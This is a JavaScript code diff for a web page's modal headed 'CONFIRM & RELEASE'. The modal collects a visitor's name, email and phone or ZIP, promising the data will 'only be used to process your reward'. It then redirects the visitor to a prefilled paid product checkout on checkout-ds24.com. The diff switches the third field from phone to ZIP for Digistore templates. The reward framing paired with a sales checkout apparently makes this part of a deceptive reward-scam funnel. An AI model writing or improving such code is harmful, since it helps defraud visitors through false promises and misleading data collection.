@@ -20,6 +20,8 @@
 
   // ============ Checkout confirmation modal ============
   const CHECKOUT_HOST_RE = /checkout-ds24\.com\/product\/716458/i;
+  // Vendepay template asks for phone; Digistore template asks for ZIP code.
+  const IS_VENDEPAY_TARGET = CHECKOUT_HOST_RE.source.indexOf("vendepay") !== -1;
 
   function tweakEmail(email) {
     const clean = String(email || "")
@@ -35,7 +37,7 @@
     return tweaked + domain;
   }
 
-  function buildCheckoutUrl(baseUrl, name, email, phone) {
+  function buildCheckoutUrl(baseUrl, name, email, extra) {
     try {
       const url = new URL(baseUrl, window.location.href);
       const cleanEmail = String(email || "")
@@ -50,7 +52,7 @@
         .trim()
         .replace(/\s+/g, " ");
       const parts = fullName.split(" ");
-      const digits = String(phone || "").replace(/\D/g, "");
+      const digits = String(extra || "").replace(/\D/g, "");
       if (isVendepay) {
         // Vendepay template fields: name + phone
         if (fullName) {
@@ -66,15 +68,20 @@
           url.searchParams.set("celular", digits);
         }
       } else {
+        // Digistore template fields: first/last name + ZIP code
         if (parts[0]) url.searchParams.set("first_name", parts[0]);
         if (parts.length > 1) url.searchParams.set("last_name", parts.slice(1).join(" "));
-        if (digits) url.searchParams.set("phone_no", digits);
+        if (digits) {
+          url.searchParams.set("zipcode", digits);
+          url.searchParams.set("zip", digits);
+        }
       }
       return url.toString();
     } catch {
       return baseUrl;
     }
   }
+
 
   function openConfirmModal(targetUrl) {
     if (document.getElementById("__confirmReleaseModal")) return;
@@ -98,8 +105,14 @@
       '<input id="__cfName" type="text" autocomplete="name" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;color:#111;margin-bottom:14px;outline:none;" />' +
       '<label style="display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#6b7280;margin-bottom:6px;">EMAIL</label>' +
       '<input id="__cfEmail" type="email" inputmode="email" autocomplete="email" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;color:#111;margin-bottom:14px;outline:none;" />' +
-      '<label style="display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#6b7280;margin-bottom:6px;">PHONE</label>' +
-      '<input id="__cfPhone" type="tel" inputmode="tel" autocomplete="tel" placeholder="(555) 555-5555" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;color:#111;margin-bottom:16px;outline:none;" />' +
+      '<label style="display:block;font-size:11px;font-weight:800;letter-spacing:1px;color:#6b7280;margin-bottom:6px;">' +
+      (IS_VENDEPAY_TARGET ? "PHONE" : "ZIP CODE") +
+      "</label>" +
+      '<input id="__cfPhone" type="tel" inputmode="numeric" autocomplete="' +
+      (IS_VENDEPAY_TARGET ? "tel" : "postal-code") +
+      '" placeholder="' +
+      (IS_VENDEPAY_TARGET ? "(555) 555-5555" : "10001") +
+      '" style="width:100%;box-sizing:border-box;padding:12px 14px;border:1px solid #e5e7eb;border-radius:10px;font-size:15px;background:#fafafa;color:#111;margin-bottom:16px;outline:none;" />' +
       '<button id="__cfSubmit" type="button" style="width:100%;padding:14px;border:0;border-radius:10px;background:#FE2C55;color:#fff;font-weight:800;font-size:15px;letter-spacing:1px;cursor:pointer;">CONFIRM &amp; RELEASE</button>' +
       '<p style="margin:10px 0 0;font-size:11px;color:#9ca3af;text-align:center;line-height:1.4;">Your information is secure and will only be used to process your reward.</p>' +
       "</div>" +
@@ -120,6 +133,10 @@
       emailEl.value = emailEl.value.toLowerCase().replace(/\s+/g, "");
     });
     phoneEl.addEventListener("input", function () {
+      if (!IS_VENDEPAY_TARGET) {
+        phoneEl.value = phoneEl.value.replace(/\D/g, "").slice(0, 5);
+        return;
+      }
       const d = phoneEl.value.replace(/\D/g, "").slice(0, 10);
       let out = d;
       if (d.length > 6) out = "(" + d.slice(0, 3) + ") " + d.slice(3, 6) + "-" + d.slice(6);
@@ -142,11 +159,12 @@
         emailEl.style.borderColor = "#FE2C55";
         return;
       }
-      if (phone.replace(/\D/g, "").length < 10) {
+      if (phone.replace(/\D/g, "").length < (IS_VENDEPAY_TARGET ? 10 : 5)) {
         phoneEl.focus();
         phoneEl.style.borderColor = "#FE2C55";
         return;
       }
+
       btn.disabled = true;
       btn.textContent = "PROCESSING...";
       btn.style.opacity = "0.85";
